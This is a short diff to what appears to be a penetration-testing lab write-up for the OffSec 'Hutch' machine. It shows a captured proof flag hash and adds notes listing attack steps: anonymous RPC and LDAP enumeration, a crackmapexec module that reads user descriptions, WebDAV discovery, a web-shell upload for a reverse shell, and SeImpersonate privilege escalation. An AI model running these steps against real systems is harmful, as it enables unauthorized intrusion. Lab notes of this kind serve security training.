@@ -630,6 +630,15 @@ C:\Users\Administrator\Desktop> type proof.txt
 486de9e68f17ec8a3a393103d2ff3c4e
 ```
 
+Videos commands 
+```
+1. rpcclient -U "" -N $ip, enumdomusers (anonymous)
+2. ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=hutch,DC=offsec" (anonymous)
+3. crackmapexec ldap $ip -u '' -p '' -M get-desc-users
+4. cadaver $ip (presence of webdav)
+5. upload cmd.apsx, get reverse shell
+6. use seimpersonate  as priv esc. 
+```
 
 ## Internal
 1. Rustscan
